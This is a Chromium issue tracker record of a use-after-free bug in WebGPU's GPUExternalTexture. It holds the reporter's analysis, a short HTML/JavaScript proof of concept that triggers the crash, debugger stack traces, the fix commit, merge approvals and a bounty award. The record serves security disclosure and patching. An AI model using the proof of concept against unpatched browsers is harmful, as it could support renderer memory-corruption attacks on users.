# Security: Use After Free of GPUExternalTexture object in renderer process.

| Field | Value |
|-------|-------|
| **Issue ID** | [40060179](https://issues.chromium.org/issues/40060179) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGPU |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | lo...@gmail.com |
| **Assignee** | cw...@chromium.org |
| **Created** | 2022-07-06 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

Specifically crafted HTML file can trigger Use After Free of GPUExternalTexture object in renderer process. This bug can potentially be exploited to achieve one click Remote Code Execution in renderer process.

```
Open the PoC (UAF_GPUExternalTexture_PoC.html) in chrome with command line option "--enable-features=WebGPUService --enable-blink-features=WebGPU".   
When the web page is initially loaded, a blink object GPUExternalTexture is created for the imported external texture:  
	  
	GPUExternalTexture\* GPUExternalTexture::FromVideoFrame(){  
	  ...  
	  GPUExternalTexture\* external_texture = GPUExternalTexture::CreateImpl(  
		  device, webgpu_desc, source.media_video_frame, source.video_renderer,  
		  absl::nullopt, exception_state);  

Then, a weak reference (which does not keep the pointed object alive) to this object is added to the active external texture list (active_external_textures_) of object GPUDevice: 	    
	GPUExternalTexture\* GPUExternalTexture::FromVideoFrame(){  
	  ...  
	  device->AddActiveExternalTexture(external_texture);  

When the web page is refreshed, the worker thread is shut down.   
The GPUExternalTexture object is freed first by :WorkerThread::GCSupport::~GCSupport():  


>	chrome.dll!blink::GPUExternalTexture::~GPUExternalTexture() Line 21	C++  
	[Inline Frame] chrome.dll!cppgc::internal::`anonymous namespace'::InlinedFinalizationBuilder<cppgc::internal::(anonymous namespace)::RegularFreeHandler>::AddFinalizer(cppgc::internal::HeapObjectHeader \* header, unsigned __int64 size) Line 235	C++  
	[Inline Frame] chrome.dll!cppgc::internal::`anonymous namespace'::SweepNormalPage(cppgc::internal::NormalPage \* page, v8::PageAllocator & page_allocator, cppgc::internal::`anonymous namespace'::StickyBits sticky_bits) Line 341	C++  
	[Inline Frame] chrome.dll!cppgc::internal::`anonymous namespace'::MutatorThreadSweeper::VisitNormalPage(cppgc::internal::NormalPage & page) Line 563	C++  
	[Inline Frame] chrome.dll!cppgc::internal::HeapVisitor<cppgc::internal::(anonymous namespace)::MutatorThreadSweeper>::VisitNormalPageImpl(cppgc::internal::NormalPage & page) Line 75	C++  
	chrome.dll!cppgc::internal::HeapVisitor<cppgc::internal::(anonymous namespace)::MutatorThreadSweeper>::Traverse(cppgc::internal::BasePage & page) Line 47	C++  
	[Inline Frame] chrome.dll!cppgc::internal::`anonymous namespace'::MutatorThreadSweeper::SweepPage(cppgc::internal::BasePage & page) Line 512	C++  
	[Inline Frame] chrome.dll!cppgc::internal::`anonymous namespace'::MutatorThreadSweeper::Sweep() Line 507	C++  
	chrome.dll!cppgc::internal::Sweeper::SweeperImpl::Finish() Line 884	C++  
	chrome.dll!cppgc::internal::Sweeper::SweeperImpl::Start(cppgc::internal::Sweeper::SweepingConfig config, cppgc::Platform \* platform) Line 788	C++  
	chrome.dll!cppgc::internal::Sweeper::Start(cppgc::internal::Sweeper::SweepingConfig config) Line 1061	C++  
	chrome.dll!cppgc::internal::HeapBase::Terminate() Line 265	C++  
	[Inline Frame] chrome.dll!blink::ThreadState::~ThreadState() Line 156	C++  
	chrome.dll!blink::ThreadState::DetachCurrentThread() Line 125	C++  
	chrome.dll!blink::scheduler::WorkerThread::GCSupport::~GCSupport() Line 132	C++  
	[Inline Frame] chrome.dll!std::Cr::default_delete<blink::scheduler::WorkerThread::GCSupport>::operator()(blink::scheduler::WorkerThread::GCSupport \* __ptr) Line 51	C++  
	chrome.dll!std::Cr::unique_ptr<blink::scheduler::WorkerThread::GCSupport,std::Cr::default_delete<blink::scheduler::WorkerThread::GCSupport>>::reset(blink::scheduler::WorkerThread::GCSupport \* __p) Line 308	C++  
	[Inline Frame] chrome.dll!blink::scheduler::WorkerThread::SimpleThreadImpl::ShutdownOnThread() Line 136	C++  

Then GPUDevice is destructed:  

>	chrome.dll!blink::GPUDevice::~GPUDevice() Line 109	C++  
	chrome.dll!blink::GPUDevice::~GPUDevice() Line 115	C++  
	[Inline Frame] chrome.dll!cppgc::internal::`anonymous namespace'::InlinedFinalizationBuilder<cppgc::internal::(anonymous namespace)::RegularFreeHandler>::AddFinalizer(cppgc::internal::HeapObjectHeader \* header, unsigned __int64 size) Line 235	C++  
	[Inline Frame] chrome.dll!cppgc::internal::`anonymous namespace'::SweepNormalPage(cppgc::internal::NormalPage \* page, v8::PageAllocator & page_allocator, cppgc::internal::`anonymous namespace'::StickyBits sticky_bits) Line 341	C++  
	[Inline Frame] chrome.dll!cppgc::internal::`anonymous namespace'::MutatorThreadSweeper::VisitNormalPage(cppgc::internal::NormalPage & page) Line 563	C++  
	[Inline Frame] chrome.dll!cppgc::internal::HeapVisitor<cppgc::internal::(anonymous namespace)::MutatorThreadSweeper>::VisitNormalPageImpl(cppgc::internal::NormalPage & page) Line 75	C++  
	chrome.dll!cppgc::internal::HeapVisitor<cppgc::internal::(anonymous namespace)::MutatorThreadSweeper>::Traverse(cppgc::internal::BasePage & page) Line 47	C++  
	[Inline Frame] chrome.dll!cppgc::internal::`anonymous namespace'::MutatorThreadSweeper::SweepPage(cppgc::internal::BasePage & page) Line 512	C++  
	[Inline Frame] chrome.dll!cppgc::internal::`anonymous namespace'::MutatorThreadSweeper::Sweep() Line 507	C++  
	chrome.dll!cppgc::internal::Sweeper::SweeperImpl::Finish() Line 884	C++  
	chrome.dll!cppgc::internal::Sweeper::SweeperImpl::Start(cppgc::internal::Sweeper::SweepingConfig config, cppgc::Platform \* platform) Line 788	C++  
	chrome.dll!cppgc::internal::Sweeper::Start(cppgc::internal::Sweeper::SweepingConfig config) Line 1061	C++  
	chrome.dll!cppgc::internal::HeapBase::Terminate() Line 265	C++  
	[Inline Frame] chrome.dll!blink::ThreadState::~ThreadState() Line 156	C++  
	chrome.dll!blink::ThreadState::DetachCurrentThread() Line 125	C++  
	chrome.dll!blink::scheduler::WorkerThread::GCSupport::~GCSupport() Line 132	C++  
	  
In the destructor of GPUDevice, DestroyAllExternalTextures() is called to destroyed all external textures:  
	GPUDevice::~GPUDevice() {  
	  DestroyAllExternalTextures();  

However, inside DestroyAllExternalTextures(), the GPUExternalTexture object that external_texture points to has been freed as stated above. so external_texture->Destroy() is Use After Free:  

	void GPUDevice::DestroyAllExternalTextures() {  
	  ...  
		external_texture->Destroy();    

```

**VERSION**  

Google Chrome 105.0.5148.2 (Official Build) dev (64-bit) (cohort: Dev)  

Revision c065963d408f232030d1ccc9689bd9e202101782-refs/branch-heads/5148@{#4}  

OS Windows 11 Version 21H2 (Build 22000.739)  

JavaScript V8 10.5.94

**REPRODUCTION CASE** (UAF\_GPUExternalTexture\_PoC.html)  

<script>  

var blob = new Blob(['osCanvas = new OffscreenCanvas(120, 120); osCanvas.getContext("2d");vFrame = new VideoFrame(osCanvas ,{timestamp:1000, duration:1000});navigator.gpu.requestAdapter().then((adapter)=>{adapter.requestDevice().then((device)=>{device.importExternalTexture({source: vFrame}); });});'],{type: "text/javascript"});  

new Worker(window.URL.createObjectURL(blob));  

setTimeout(function(){location.reload();},900);  

</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

```
(29c.1a90): Access violation - code c0000005 (!!! second chance !!!)  
chrome!std::Cr::__cxx_atomic_load [inlined in chrome!blink::GPUExternalTexture::Destroy]:  
00007ffd`fbea9600 8b4168          mov     eax,dword ptr [rcx+68h] ds:000014bc`01961fb8=????????  
10:169> r  
rax=0000000000000008 rbx=000014bc01be2400 rcx=000014bc01961f50  
rdx=0000000000000028 rsi=000014bc01be2428 rdi=000014bc01be2428  
rip=00007ffdfbea9600 rsp=0000000a427fea58 rbp=00000000000000e8  
 r8=0000000000000090  r9=0000000000000000 r10=00000fffbf763200  
r11=0000000000000051 r12=0000000a427fec00 r13=0000000000000000  
r14=000014bc016e3470 r15=000014bc016ff000  
iopl=0         nv up ei ng nz ac po cy  
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010295  
chrome!std::Cr::__cxx_atomic_load [inlined in chrome!blink::GPUExternalTexture::Destroy]:  
00007ffd`fbea9600 8b4168          mov     eax,dword ptr [rcx+68h] ds:000014bc`01961fb8=????????  

10:169> k  
 # Child-SP          RetAddr           Call Site  
00 (Inline Function) --------`-------- chrome!std::Cr::__cxx_atomic_load [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\atomic @ 953]   
01 (Inline Function) --------`-------- chrome!std::Cr::__atomic_base<blink::GPUExternalTexture::Status,0>::load [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\atomic @ 1583]   
02 (Inline Function) --------`-------- chrome!std::Cr::__atomic_base<blink::GPUExternalTexture::Status,0>::operator blink::GPUExternalTexture::Status [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\atomic @ 1587]   
03 0000000a`427fea58 00007ffd`fbb17bb4 chrome!blink::GPUExternalTexture::Destroy [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webgpu\gpu_external_texture.cc @ 512]   
04 0000000a`427fea60 00007ffd`f580042e chrome!blink::GPUDevice::DestroyAllExternalTextures+0x64 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webgpu\gpu_device.cc @ 583]   
05 0000000a`427feab0 00007ffd`fbb1900d chrome!blink::GPUDevice::~GPUDevice+0xe [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webgpu\gpu_device.cc @ 112]   
06 0000000a`427feaf0 00007ffd`f5fd884f chrome!blink::GPUDevice::~GPUDevice+0xd [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webgpu\gpu_device.cc @ 115]   
07 (Inline Function) --------`-------- chrome!cppgc::internal::FinalizerTraitImpl<blink::ScriptWrappable,1>::Destructor::Call+0x8 [C:\b\s\w\ir\cache\builder\src\v8\include\cppgc\internal\finalizer-trait.h @ 42]   
08 (Inline Function) --------`-------- chrome!cppgc::internal::FinalizerTraitImpl<blink::ScriptWrappable,1>::Finalize+0x8 [C:\b\s\w\ir\cache\builder\src\v8\include\cppgc\internal\finalizer-trait.h @ 52]   
09 (Inline Function) --------`-------- chrome!cppgc::internal::FinalizerTrait<blink::ScriptWrappable>::Finalize+0x8 [C:\b\s\w\ir\cache\builder\src\v8\include\cppgc\internal\finalizer-trait.h @ 76]   
0a (Inline Function) --------`-------- chrome!cppgc::internal::HeapObjectHeader::Finalize+0x8 [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\heap-object-header.cc @ 36]   
0b (Inline Function) --------`-------- chrome!cppgc::internal::`anonymous namespace'::InlinedFinalizationBuilder<cppgc::internal::(anonymous namespace)::RegularFreeHandler>::AddFinalizer+0x8 [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\sweeper.cc @ 235]   
0c (Inline Function) --------`-------- chrome!cppgc::internal::`anonymous namespace'::SweepNormalPage+0x70a [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\sweeper.cc @ 341]   
0d (Inline Function) --------`-------- chrome!cppgc::internal::`anonymous namespace'::MutatorThreadSweeper::VisitNormalPage+0x783 [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\sweeper.cc @ 563]   
0e (Inline Function) --------`-------- chrome!cppgc::internal::HeapVisitor<cppgc::internal::(anonymous namespace)::MutatorThreadSweeper>::VisitNormalPageImpl+0x783 [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\heap-visitor.h @ 75]   
0f 0000000a`427feb20 00007ffd`f5fd7f7c chrome!cppgc::internal::HeapVisitor<cppgc::internal::(anonymous namespace)::MutatorThreadSweeper>::Traverse+0x7bf [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\heap-visitor.h @ 52]   
10 (Inline Function) --------`-------- chrome!cppgc::internal::`anonymous namespace'::MutatorThreadSweeper::SweepPage+0xb [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\sweeper.cc @ 512]   
11 (Inline Function) --------`-------- chrome!cppgc::internal::`anonymous namespace'::MutatorThreadSweeper::Sweep+0x4f [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\sweeper.cc @ 507]   
12 0000000a`427fec00 00007ffd`f5fd7c1c chrome!cppgc::internal::Sweeper::SweeperImpl::Finish+0xcc [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\sweeper.cc @ 884]   
13 0000000a`427fecd0 00007ffd`f3d4e778 chrome!cppgc::internal::Sweeper::SweeperImpl::Start+0x34c [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\sweeper.cc @ 788]   
14 0000000a`427fedc0 00007ffd`f8a5736c chrome!cppgc::internal::Sweeper::Start+0x38 [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\sweeper.cc @ 1061]   
15 0000000a`427fee00 00007ffd`f8c3d100 chrome!cppgc::internal::HeapBase::Terminate+0x16c [C:\b\s\w\ir\cache\builder\src\v8\src\heap\cppgc\heap-base.cc @ 265]   
16 0000000a`427feeb0 00007ffd`f8c3d0e1 chrome!blink::ThreadState::~ThreadState+0x10 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\heap\thread_state.cc @ 157]   
17 0000000a`427feee0 00007ffd`f8c489be chrome!blink::ThreadState::DetachCurrentThread+0x21 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\heap\thread_state.cc @ 125]   
18 0000000a`427fef10 00007ffd`f8c4896b chrome!blink::scheduler::WorkerThread::GCSupport::~GCSupport+0x3e [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\scheduler\worker\worker_thread.cc @ 133]   
19 (Inline Function) --------`-------- chrome!std::Cr::default_delete<blink::scheduler::WorkerThread::GCSupport>::operator()+0x8 [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h @ 51]   
1a (Inline Function) --------`-------- chrome!std::Cr::unique_ptr<blink::scheduler::WorkerThread::GCSupport,std::Cr::default_delete<blink::scheduler::WorkerThread::GCSupport> >::reset+0x3e [C:\b\s\w\ir\cache\builder\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h @ 308]   
1b (Inline Function) --------`-------- chrome!blink::scheduler::WorkerThread::SimpleThreadImpl::ShutdownOnThread+0x3e [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\scheduler\worker\worker_thread.cc @ 136]   
1c 0000000a`427fef50 00007ffd`faa82df1 chrome!blink::scheduler::WorkerThread::ShutdownOnThread+0x4b [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\scheduler\worker\worker_thread.cc @ 82]   
1d 0000000a`427fef90 00007ffd`fb150ec8 chrome!blink::WorkerBackingThread::ShutdownOnBackingThread+0x71 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\workers\worker_backing_thread.cc @ 115]   
1e 0000000a`427feff0 00007ffd`f663a580 chrome!blink::WorkerThread::PerformShutdownOnWorkerThread+0x138 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\workers\worker_thread.cc @ 792]   
1f (Inline Function) --------`-------- chrome!base::OnceCallback<void ()>::Run+0x17 [C:\b\s\w\ir\cache\builder\src\base\callback.h @ 143]   
20 (Inline Function) --------`-------- chrome!base::TaskAnnotator::RunTaskImpl+0x18e [C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc @ 135]   
21 (Inline Function) --------`-------- chrome!base::TaskAnnotator::RunTask+0x941 [C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.h @ 74]   
22 (Inline Function) --------`-------- chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0x1072 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 409]   
23 0000000a`427ff060 00007ffd`f27ac886 chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0x1140 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 287]   
24 0000000a`427ff940 00007ffd`f2be16d8 chrome!base::MessagePumpDefault::Run+0x86 [C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc @ 41]   
25 0000000a`427ff9f0 00007ffd`f2c96ec5 chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0xa8 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 557]   
26 0000000a`427ffa60 00007ffd`f342d945 chrome!base::RunLoop::Run+0x1d5 [C:\b\s\w\ir\cache\builder\src\base\run_loop.cc @ 143]   
27 0000000a`427ffb70 00007ffd`f2a1e45f chrome!blink::scheduler::WorkerThread::SimpleThreadImpl::Run+0x165 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\scheduler\worker\worker_thread.cc @ 156]   
28 0000000a`427ffc50 00007ffe`841954e0 chrome!base::`anonymous namespace'::ThreadFunc+0x11f [C:\b\s\w\ir\cache\builder\src\base\threading\platform_thread_win.cc @ 122]   
29 0000000a`427ffce0 00007ffe`84a0485b KERNEL32!BaseThreadInitThunk+0x10  
2a 0000000a`427ffd10 00000000`00000000 ntdll!RtlUserThreadStart+0x2b  

```

**CREDIT INFORMATION**  

Reporter credit: Looben Yang

## Attachments

- [UAF_GPUExternalTexture_PoC.html](attachments/UAF_GPUExternalTexture_PoC.html) (text/plain, 447 B)

## Timeline

### [Deleted User] (2022-07-06)

[Empty comment from Monorail migration]

### da...@chromium.org (2022-07-06)

HighSev for memory bug in the Renderer sandbox
Impact None as WebGPU is behind a flag, but should be blocking WebGPU experiments or launch.

[Monorail components: Blink>WebGPU]

### da...@chromium.org (2022-07-06)

Doing stuff from a destructor for a GC-managed object is fraught, it can stick around an arbitrary amount of time before the destructor runs, and it's not well-ordered WRT other objects.


cc: oilpan security folks for awareness

### da...@chromium.org (2022-07-06)

[Empty comment from Monorail migration]

### cw...@chromium.org (2022-07-06)

Adding the impact back as WebGPU is shipping in Origin Trial. The bug was introduced in https://chromium-review.googlesource.com/c/chromium/src/+/3652008 which has branched in M104 so we'll have to do a cherry-pick.

It seems we'll have to add a pre-finalizer to GPUDevice: https://chromium.googlesource.com/chromium/src/+/HEAD/third_party/blink/renderer/platform/heap/BlinkGCAPIReference.md#using_pre_finalizer

Tentatively leaving Kai as owner because I'm not going to be able to do a Chromium build today, but feel free to reassign, I can look at it tomorrow.

### ml...@chromium.org (2022-07-06)

Thanks for cc. Some clarifications:
- Destructors in Oilpan are indeed unordered. 
- (Pre-finalizers are actually ordered wrt to registration time but they are way slower.)
- Worker shutdown generally means the whole heap is unreachable immediately. 
- Staged finalization (Object A is destructed before object B) is brittle, c.f. Hans Boehms work on Java: It's somewhat supported on the main thread (by using Persistent's that are cleared in a finalizer of some object) but definitely not supported on worker where the whole heap is reclaimed at once.

If we have a strong incentive for staged finalization, please file a feature request for Oilpan but generally we would like to keep semantics there simple, in that there's no guarantees.



### [Deleted User] (2022-07-06)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-07-06)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cw...@chromium.org (2022-07-07)

Taking over this.

### gi...@appspot.gserviceaccount.com (2022-07-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/7c47fe5b10d255f235d7ff05436265fab7c402a8

commit 7c47fe5b10d255f235d7ff05436265fab7c402a8
Author: Corentin Wallez <cwallez@chromium.org>
Date: Thu Jul 07 20:03:54 2022

Fix accesses to other GC objects in the GPUDevice destructor.

Use a PreFinalizer instead.

Bug: chromium:1342155
Change-Id: I252c314101595a23c0725f5ecead80b979bff49c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3751162
Reviewed-by: Kai Ninomiya <kainino@chromium.org>
Commit-Queue: Kai Ninomiya <kainino@chromium.org>
Reviewed-by: Austin Eng <enga@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1021820}

[modify] https://crrev.com/7c47fe5b10d255f235d7ff05436265fab7c402a8/third_party/blink/renderer/modules/webgpu/gpu_device.cc
[modify] https://crrev.com/7c47fe5b10d255f235d7ff05436265fab7c402a8/third_party/blink/renderer/modules/webgpu/gpu_device.h


### [Deleted User] (2022-07-08)

Thanks for handling this.

### cw...@chromium.org (2022-07-08)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-07-08)

updating as fixed, but the bot will no longer update this in terms of merges as there has already been manual request; as this fix just landed under 24 hours ago, will need to revisit for review next week so it can get sufficient bake time on Canary over the weekend

### [Deleted User] (2022-07-08)

Merge review required: M104 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), harrysouders (iOS), obenedict (ChromeOS), srinivassista (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-07-09)

[Empty comment from Monorail migration]

### [Deleted User] (2022-07-09)

[Empty comment from Monorail migration]

### cw...@chromium.org (2022-07-11)

1 - Yes
2 - https://chromium-review.googlesource.com/c/chromium/src/+/3751162
3 - Yes
4 - No
5 - N/A
6 - No

### am...@chromium.org (2022-07-11)

Thanks for landing so quickly landing this fix. M104 merge approved, please merge to branch 5112 at your earliest convenience. 

### sr...@google.com (2022-07-12)

This CL is approved for Merge to M104, Please help complete all merges before 3pm PST today ( July 12) so that these can be included in this week's beta release going out tomorrow,. I will be cutting RC build today at 3pm PST

### gi...@appspot.gserviceaccount.com (2022-07-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/523a00d237095aac199b71a61b50e6474911976e

commit 523a00d237095aac199b71a61b50e6474911976e
Author: Corentin Wallez <cwallez@chromium.org>
Date: Tue Jul 12 17:31:19 2022

Fix accesses to other GC objects in the GPUDevice destructor.

Use a PreFinalizer instead.

(cherry picked from commit 7c47fe5b10d255f235d7ff05436265fab7c402a8)

Bug: chromium:1342155
Change-Id: I252c314101595a23c0725f5ecead80b979bff49c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3751162
Reviewed-by: Kai Ninomiya <kainino@chromium.org>
Commit-Queue: Kai Ninomiya <kainino@chromium.org>
Reviewed-by: Austin Eng <enga@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1021820}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3755532
Commit-Queue: Corentin Wallez <cwallez@chromium.org>
Cr-Commit-Position: refs/branch-heads/5112@{#816}
Cr-Branched-From: b13d3fe7b3c47a56354ef54b221008afa754412e-refs/heads/main@{#1012729}

[modify] https://crrev.com/523a00d237095aac199b71a61b50e6474911976e/third_party/blink/renderer/modules/webgpu/gpu_device.cc
[modify] https://crrev.com/523a00d237095aac199b71a61b50e6474911976e/third_party/blink/renderer/modules/webgpu/gpu_device.h


### [Deleted User] (2022-07-12)

LTS Milestone M102

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2022-07-13)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-07-13)

Congratulations, Looben Yang! The VRP Panel has decided to award you $7500 for this report. Thank you for your efforts and reporting this issue to us! Nice work! 

### vo...@google.com (2022-07-14)

Introduced in M104, so marking as not applicable for M102 LTS.

### am...@google.com (2022-07-15)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1342155?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40060179)*
